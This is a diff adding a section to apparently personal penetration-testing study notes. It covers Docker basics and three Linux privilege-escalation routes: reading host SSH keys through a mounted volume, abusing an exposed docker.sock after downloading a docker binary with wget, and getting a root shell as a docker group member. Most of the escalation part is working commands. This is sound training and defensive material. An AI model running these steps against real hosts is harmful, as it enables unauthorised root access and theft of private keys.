@@ -1530,3 +1530,112 @@ ls -l /mnt/root
 This exposes the host root filesystem, enabling **privilege escalation**.
 
 ---
+
+# Docker
+
+## Docker Basics
+- **Docker**: open-source tool for portable, consistent runtime environments.
+- Uses **containers** → isolated user-space environments at OS level.
+- Containers = lightweight, resource-efficient compared to VMs.
+- **Docker Image** = blueprint/template (code, deps, configs).
+- **Docker Container** = instance of an image (mutable, isolated).
+- **Dockerfile** = defines build steps for images.
+
+---
+
+## Docker Architecture
+- **Client-Server Model**:
+  - **Docker Daemon** (server): manages containers/images, isolation, logs, networking, volumes.
+  - **Docker Client**: CLI to issue commands via REST API or Unix socket.
+- **Docker Compose**: orchestration of multi-container apps using `docker-compose.yml`.
+- **Docker Desktop**: GUI for managing containers (supports Kubernetes).
+
+
+## Privilege Escalation with Docker
+
+### 1. Shared Directories (Volume Mounts)
+- Host directories/files mounted inside containers.
+- Can persist data, share code, or enable collaboration.
+- If RW, attacker can access sensitive host files.
+
+**Example:**
+```bash
+root@container:/hostsystem/home/cry0l1t3$ ls -l
+-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
+drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh
+
+root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+<SNIP>
+````
+
+Use key to SSH into host:
+
+```bash
+ssh cry0l1t3@<host IP> -i cry0l1t3.priv
+```
+
+### 2. Docker Sockets
+
+* Located at `/var/run/docker.sock`.
+* Bridge between **client** ↔ **daemon**.
+* If exposed/misconfigured → attacker can control Docker.
+
+**Check for socket:**
+
+```bash
+ls -al
+srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
+```
+
+**If `docker` binary missing, upload it:**
+
+```bash
+wget https://<parrot-os>:443/docker -O docker
+chmod +x docker
+```
+
+**Enumerate containers:**
+
+```bash
+/tmp/docker -H unix:///app/docker.sock ps
+```
+
+**Spawn privileged container mapping host root:**
+
+```bash
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+/tmp/docker -H unix:///app/docker.sock ps
+```
+
+**Access host filesystem:**
+
+```bash
+/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
+cat /hostsystem/root/.ssh/id_rsa
+```
+
+
+### 3. Docker Group
+
+* If user is in **docker group**, they can control Docker daemon → root.
+
+```bash
+id
+uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
+```
+
+**List images:**
+
+```bash
+docker image ls
+```
+
+**Spawn root shell via socket:**
+
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+---
+
